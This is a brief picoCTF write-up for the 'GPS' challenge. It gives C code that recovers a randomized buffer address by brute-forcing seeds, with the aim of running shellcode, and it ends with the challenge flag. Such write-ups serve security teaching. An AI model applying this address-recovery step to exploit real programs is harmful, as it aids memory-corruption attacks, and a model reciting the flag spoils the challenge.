# GPS

Given address is buffer's address, but there is some randomized offset. 

Because random's seed is buf's address, we can find out what buf's real address is. 

By following code, we can iterate over some range of buf's candidate and if match with input_address, that is real buf's address.

```
int main() {

    unsigned long long input_addr = 0;
    scanf("%lld", &input_addr);
    int temp_rand = 0;

    for (unsigned long long buf = input_addr - 0x40 - (unsigned long long)GPS_ACCURACY / 2; buf < input_addr + (unsigned long long)GPS_ACCURACY / 2; buf++) {
        srand((unsigned)(uintptr_t)buf);

        for (int i = 0; i < 3; ++i) {
            for (int j = 0; j < rand()%10; ++j) {
            }
        }
        int offset = rand() % GPS_ACCURACY - (GPS_ACCURACY / 2);

        if (input_addr == buf - 0x35 + offset) {
            printf("%llx\n", buf);
            return 0;
        }
    }

    printf("not found..\n");
    return 0;
}
```

When we know buf's address, Just execute our shell code!

`picoCTF{s4v3_y0urs3lf_w1th_a_sl3d_0f_n0ps_gvzbnemc}`